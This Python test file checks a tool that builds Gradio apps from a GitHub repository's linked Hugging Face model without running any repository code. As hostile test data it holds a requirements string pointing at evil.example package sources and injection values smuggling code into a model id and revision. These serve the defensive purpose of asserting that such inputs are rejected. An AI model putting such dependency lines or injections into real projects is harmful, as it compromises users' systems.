"""GitHub -> Gradio generation, THROUGH the repository's own linked Hugging Face model.

A GitHub repository is never run, imported or installed. It yields an app only when its own Hugging Face model is identified,
readable, and passes the complete Hugging Face analysis (plus extra GitHub-only guards). Everything runs offline against the
fake transport in fakehub.py: no network, no weights, no repository code.
"""
import dataclasses
import json
import tempfile
import unittest
from pathlib import Path
from urllib.parse import urlsplit

from m2g import analyzer as an
from m2g import gradio_gen as gg
from m2g import inspector as ins
from m2g.colab_gen import generate_notebook
from m2g.config import Settings
from m2g.pipeline import run_pipeline, summarize
from m2g.security import SourceRef
from m2g.validate import combine_package_source, validate_app_code, validate_notebook, validate_requirements_text
from fakehub import FakeWeb, PRESETS, SHA, add_github_repo, add_hf_model
from test_analyzer import SUPPORTED_EXPECT, analyze_preset, flamingo_info

WEIGHT_SUFFIXES = (".safetensors", ".bin", ".gguf", ".pt", ".pth", ".ckpt", ".onnx")
UNSUPPORTED_LINKED = ("remote", "pickle", "gguf", "gptq", "lora", "unknown", "unsupported_task")
SAME_AS_HF = ("task", "task_confidence", "library", "inputs", "outputs", "dependencies", "dependency_evidence", "hardware", "chat",
              "quantization", "load_in_4bit_recommended", "use_safetensors", "trust_remote_code", "min_transformers", "gated")


def readme_for(model_id, name):
    return f"# {name}\nThe pretrained model is available at https://huggingface.co/{model_id}\n"


def github_repo_for(key, *, settings=None, readme=None, requirements="torch>=2.0\ntransformers\n", tree=None, extra_files=None,
                    **override):
    """A GitHub repository (same owner/name as the preset's Hugging Face model) whose README points at that model."""
    spec = dict(PRESETS[key])
    spec.update(override)
    model_id = spec.pop("repo_id")
    owner, name = model_id.split("/")
    web = FakeWeb()
    add_hf_model(web, model_id, **spec)
    add_github_repo(web, f"{owner}/{name}", readme=readme or readme_for(model_id, name), requirements=requirements, tree=tree,
                    extra_files=extra_files)
    url = f"https://github.com/{owner}/{name}"
    return web, url, an.analyze(ins.inspect_url(url, web.fetcher()), settings or Settings())


class TestGitHubWithSupportedLinkedModel(unittest.TestCase):
    def test_every_supported_model_is_generatable_through_its_github_repo(self):
        for key in SUPPORTED_EXPECT:
            with self.subTest(key):
                _, _, gh = github_repo_for(key)
                hf = analyze_preset(key)
                self.assertTrue(gh.generatable, (gh.status, gh.reasons))
                self.assertEqual(gh.source.kind, "github")
                self.assertEqual(gh.model_ref.kind, "huggingface")
                self.assertEqual(gh.model_ref.repo_id, PRESETS[key]["repo_id"])
                self.assertEqual(gh.primary_model, PRESETS[key]["repo_id"])
                # nothing about task detection, I/O mapping, dependencies or hardware is re-implemented: it IS the HF analysis
                for name in SAME_AS_HF:
                    self.assertEqual(getattr(gh, name), getattr(hf, name), name)
                self.assertEqual(gh.revision, SHA)
                self.assertEqual(gg.generate_requirements(gh), gg.generate_requirements(hf))

    def test_the_generated_app_loads_the_linked_hugging_face_model_at_its_hf_revision(self):
        for key in SUPPORTED_EXPECT:
            with self.subTest(key):
                _, _, gh = github_repo_for(key)
                code = gg.generate_app(gh)
                report = validate_app_code(code)  # the same static validation as every Hugging Face app
                model_id = PRESETS[key]["repo_id"]
                self.assertEqual(report["model_id"], model_id)
                self.assertEqual(report["revision"], SHA)  # a Hugging Face commit, not the GitHub branch
                self.assertFalse(report["trust_remote_code"])
                self.assertIn(f"MODEL_ID = {model_id!r}", code)
                self.assertNotIn("REVISION = 'main'", code)
                self.assertIn("USE_SAFETENSORS = True", code)
                self.assertIn("linked from GitHub repository", code)  # provenance is shown, but never loaded
                for comp in gh.inputs + gh.outputs:
                    self.assertIn(comp["component"], code, comp)

    def test_notebook_is_valid_and_points_at_the_linked_model(self):
        _, url, gh = github_repo_for("sst2")
        nb = generate_notebook(gh)
        validate_notebook(json.loads(json.dumps(nb)))
        title = "".join(nb["cells"][0]["source"])
        self.assertIn(PRESETS["sst2"]["repo_id"], title)
        self.assertIn("Found via GitHub repository", title)
        self.assertEqual(nb["metadata"]["colab"]["name"], PRESETS["sst2"]["repo_id"] + ".ipynb")

    def test_repository_requirements_and_scripts_are_never_used(self):
        evil = "evil-pkg==1.0\ngit+https://evil.example/x.git\n--index-url http://evil.example/simple\ntorch\n"
        _, _, gh = github_repo_for("sst2", requirements=evil)
        self.assertTrue(gh.generatable, gh.reasons)
        text = gg.generate_requirements(gh)
        validate_requirements_text(text)
        self.assertNotIn("evil", text)
        self.assertEqual(text, gg.generate_requirements(analyze_preset("sst2")))
        self.assertIn("evil-pkg==1.0", gh.repo_requirements)  # recorded for the user, never installed
        self.assertNotIn("evil-pkg", gh.dependencies)
        self.assertTrue(gh.requirement_flags)

    def test_gated_and_quantized_linked_models_keep_their_huggingface_handling(self):
        _, _, big = github_repo_for("big7b")
        self.assertTrue(big.generatable)
        self.assertTrue(big.gated and big.load_in_4bit_recommended)
        self.assertIn("LOAD_IN_4BIT = (True or", gg.generate_app(big))
        _, _, bnb = github_repo_for("bnb4")
        self.assertIn("PREQUANTIZED = True", gg.generate_app(bnb))

    def test_remote_code_gate_is_the_same_as_for_a_hugging_face_url(self):
        _, _, refused = github_repo_for("remote")
        self.assertFalse(refused.generatable)
        self.assertTrue(any("trust_remote_code" in r for r in refused.reasons), refused.reasons)
        opted = Settings(allow_remote_code=True)
        _, _, gh = github_repo_for("remote", settings=opted)  # explicit opt-in, exactly as for a Hugging Face URL
        self.assertTrue(gh.generatable)
        code = gg.generate_app(gh, opted)
        self.assertIn("TRUST_REMOTE_CODE = True", code)
        with self.assertRaises(Exception):
            validate_app_code(code, Settings())  # and the app validator still rejects it without the opt-in

    def test_analysis_is_json_serialisable_and_records_both_sources(self):
        _, _, gh = github_repo_for("sst2")
        data = json.loads(json.dumps(gh.to_dict()))
        self.assertEqual(data["source"]["kind"], "github")
        self.assertEqual(data["model_source"]["kind"], "huggingface")
        self.assertEqual(data["model_source"]["repo_id"], PRESETS["sst2"]["repo_id"])
        self.assertEqual(data["host"], "github")


class TestGitHubRefusals(unittest.TestCase):
    def assert_refused(self, gh, *needles):
        self.assertEqual(gh.status, "partial", gh.reasons)
        self.assertFalse(gh.generatable)
        self.assertIsNone(gh.model_source)
        with self.assertRaises(gg.GenerationError):
            gg.generate_app(gh)
        with self.assertRaises(gg.GenerationError):
            generate_notebook(gh)
        joined = " ".join(gh.reasons)
        self.assertIn("never executed", joined)  # the original safe-refusal wording is kept
        for needle in needles:
            self.assertIn(needle, joined)

    def test_an_unsupported_linked_model_keeps_the_safe_refusal(self):
        for key in UNSUPPORTED_LINKED:
            with self.subTest(key):
                _, _, gh = github_repo_for(key)
                # A direct Hugging Face analysis of a pickle-only model is a generatable CANDIDATE (runtime pickle loading stays off without
                # consent); only adoption THROUGH a GitHub repository is refused (see analyzer._check_linked_model).
                self.assertEqual(analyze_preset(key).generatable, key == "pickle")
                self.assert_refused(gh, "cannot be generated")
                self.assertNotIn("analyse that URL", " ".join(gh.reasons))  # it would be refused too
                expected = "supported_with_warnings" if key == "pickle" else "unsupported"
                self.assertEqual(gh.ui_hints["primary_model_status"], expected)

    def test_custom_code_vision_language_repo_is_still_refused_without_any_special_case(self):
        web = FakeWeb()
        config = {"architectures": ["FlamingoModel"], "model_type": "flamingo",
                  "auto_map": {"AutoModel": "modeling_flamingo.FlamingoModel"}}
        info = flamingo_info(web, primary_model=True, pipeline_tag="image-to-text", safetensors_total=500_000_000, config=config,
                             files=[("config.json", 800), ("model.safetensors", 1_000_000_000), ("README.md", 100)])
        gh = an.analyze(info)
        self.assert_refused(gh, "trust_remote_code")

    def test_no_linked_model_is_refused_and_the_hub_is_not_contacted(self):
        web = FakeWeb()
        add_github_repo(web, "acme/plain", readme="# Plain\nA small classifier.\n", requirements="torch\n")
        gh = an.analyze(ins.inspect_url("https://github.com/acme/plain", web.fetcher()))
        self.assert_refused(gh)
        self.assertIsNone(gh.primary_model)
        self.assertFalse([c for c in web.calls if "huggingface.co" in c])

    def test_unreadable_linked_model_metadata_is_refused(self):
        web = FakeWeb()
        add_github_repo(web, "acme/ghost", readme=readme_for("acme/ghost", "ghost"))  # the model is not on the (fake) Hub
        gh = an.analyze(ins.inspect_url("https://github.com/acme/ghost", web.fetcher()))
        self.assert_refused(gh, "analyse that URL")
        self.assertTrue(any("could not be read" in u for u in gh.uncertainties))

    def test_ambiguous_links_are_not_guessed(self):
        web = FakeWeb()
        for model in ("foo/bar-a", "foo/bar-b"):
            add_hf_model(web, model, **{k: v for k, v in PRESETS["sst2"].items() if k != "repo_id"})
        add_github_repo(web, "acme/toolkit", readme="# Toolkit\nSee https://huggingface.co/foo/bar-a and https://huggingface.co/foo/bar-b\n")
        gh = an.analyze(ins.inspect_url("https://github.com/acme/toolkit", web.fetcher()))
        self.assert_refused(gh, "none could be confirmed")
        self.assertIsNone(gh.primary_model)
        self.assertFalse([c for c in web.calls if "huggingface.co/api/models" in c], "no guessed model may be inspected")

    def test_a_backbone_only_link_is_not_taken_as_the_repository_model(self):
        web = FakeWeb()
        add_hf_model(web, "facebook/opt-125m", **{k: v for k, v in PRESETS["gpt2"].items() if k != "repo_id"})
        readme = ("# Toolkit\nAcknowledgements: built on the language model facebook/opt-125m "
                  "(https://huggingface.co/facebook/opt-125m) as lm: (backbone).\n")
        add_github_repo(web, "acme/toolkit", readme=readme)
        gh = an.analyze(ins.inspect_url("https://github.com/acme/toolkit", web.fetcher()))
        self.assert_refused(gh)
        self.assertIsNone(gh.primary_model)
        self.assertIn("facebook/opt-125m", gh.linked_hf_models)
        self.assertFalse([c for c in web.calls if "huggingface.co/api/models" in c])

    def test_repository_code_that_contradicts_the_linked_model_is_refused(self):
        # The repo's own code takes IMAGE input, but the linked model is a text classifier: it is a component, not the repo's model.
        code = "from transformers import CLIPVisionModel\n\nclass Encoder(CLIPVisionModel):\n    pass\n"
        _, _, gh = github_repo_for("sst2", tree=["README.md", "requirements.txt", "pkg/model.py"],
                                   extra_files={"pkg/model.py": code})
        self.assert_refused(gh, "image input")

    def test_a_task_known_only_from_tags_is_analysis_only_for_github_and_hugging_face(self):
        web = FakeWeb()
        add_hf_model(web, "acme/tagonly", pipeline_tag=None, tags=["text-classification"], config={"model_type": "mystery"},
                     safetensors_total=1_000_000, files=[("config.json", 800), ("model.safetensors", 4_000_000), ("README.md", 100)])
        add_github_repo(web, "acme/tagonly", readme=readme_for("acme/tagonly", "tagonly"))
        hf = an.analyze(ins.inspect_url("https://huggingface.co/acme/tagonly", web.fetcher()))
        # A tag is heuristic evidence only: no capability is established by firm evidence, so a Hugging Face URL is analysis-only too ...
        self.assertFalse(hf.generatable)
        self.assertEqual(hf.status, "unsupported")
        self.assertLess(hf.task_confidence, 0.6)
        self.assertIn("No capability is established by firm evidence", " ".join(hf.reasons))
        gh = an.analyze(ins.inspect_url("https://github.com/acme/tagonly", web.fetcher()))
        # ... and a GitHub repository linking to it is refused because that linked model's own analysis cannot be generated
        self.assert_refused(gh, "cannot be generated", "No capability is established by firm evidence")

    def test_the_generator_refuses_github_or_malformed_model_references(self):
        _, _, gh = github_repo_for("sst2")
        self.assertTrue(gh.generatable)
        for name, bad in {
            "github as the model": dataclasses.replace(gh, model_source=gh.source),
            "no linked model": dataclasses.replace(gh, model_source=None),
            "hostile id": dataclasses.replace(gh, model_source=SourceRef(
                "huggingface", "a/b'; import os #", "a", "b", None, "https://huggingface.co/a/b")),
            "hostile revision": dataclasses.replace(gh, revision="main'; x=1 #"),
        }.items():
            with self.subTest(name), self.assertRaises(gg.GenerationError):
                gg.generate_app(bad)


class TestGitHubPipeline(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.out = Path(self.tmp.name) / "out"

    def settings(self):
        return Settings(output_dir=self.out)

    def test_github_url_to_files_through_the_linked_model_without_touching_weights(self):
        web, url, _ = github_repo_for("sst2")
        res = run_pipeline(url, self.settings(), web.fetcher())
        self.assertTrue(res.ok, (res.error, res.notes))
        self.assertEqual(res.analysis.source.kind, "github")
        self.assertEqual(res.files, sorted(["analysis.json", "app.py", "colab_notebook.ipynb", "loader.py", "requirements.txt",
                                            "run_" + res.out_dir.name + ".bat"]))
        self.assertTrue(res.out_dir.name.startswith("github__"), res.out_dir.name)
        report = validate_app_code(combine_package_source((res.out_dir / "app.py").read_text(encoding="utf-8"),
                                                          (res.out_dir / "loader.py").read_text(encoding="utf-8")))
        self.assertEqual(report["model_id"], PRESETS["sst2"]["repo_id"])
        validate_notebook(json.loads((res.out_dir / "colab_notebook.ipynb").read_text(encoding="utf-8")))
        data = json.loads((res.out_dir / "analysis.json").read_text(encoding="utf-8"))
        self.assertEqual(data["model_source"]["repo_id"], PRESETS["sst2"]["repo_id"])
        self.assertIn("App generated from the linked Hugging Face model", summarize(res))
        # read-only inspection: no weight file was ever requested, only allow-listed hosts/files were read
        self.assertFalse([c for c in web.calls if c.endswith(WEIGHT_SUFFIXES)])
        for call in web.calls:
            self.assertIn(urlsplit(call).hostname, {"api.github.com", "raw.githubusercontent.com", "huggingface.co"}, call)
            if "/resolve/" in call:
                self.assertIn(call.rsplit("/", 1)[-1], ins.HF_FETCH_ALLOWLIST, call)

    def test_a_github_run_never_overwrites_the_output_of_the_same_named_huggingface_model(self):
        web, url, _ = github_repo_for("sst2")
        hf_res = run_pipeline("https://huggingface.co/" + PRESETS["sst2"]["repo_id"], self.settings(), web.fetcher())
        self.assertTrue(hf_res.ok, hf_res.error)
        before = (hf_res.out_dir / "app.py").read_text(encoding="utf-8")
        gh_res = run_pipeline(url, self.settings(), web.fetcher())
        self.assertTrue(gh_res.ok, gh_res.error)
        self.assertNotEqual(hf_res.out_dir, gh_res.out_dir)
        self.assertEqual((hf_res.out_dir / "app.py").read_text(encoding="utf-8"), before)

    def test_refused_repository_gets_analysis_only(self):
        web, url, _ = github_repo_for("gguf")
        res = run_pipeline(url, self.settings(), web.fetcher())
        self.assertIsNone(res.error)
        self.assertFalse(res.ok)
        self.assertIsNone(res.app_code)
        self.assertEqual(res.files, ["analysis.json"])
        self.assertFalse((res.out_dir / "app.py").exists())
        self.assertIn("Why it cannot be generated", summarize(res))


class TestHuggingFaceAnalysisIsUnchanged(unittest.TestCase):
    def test_hugging_face_analyses_have_no_separate_model_source(self):
        a = analyze_preset("sst2")
        self.assertIsNone(a.model_source)
        self.assertIs(a.model_ref, a.source)
        self.assertIn(f"MODEL_ID = {PRESETS['sst2']['repo_id']!r}", gg.generate_app(a))
        self.assertNotIn("linked from GitHub", gg.generate_app(a))


if __name__ == "__main__":
    unittest.main()
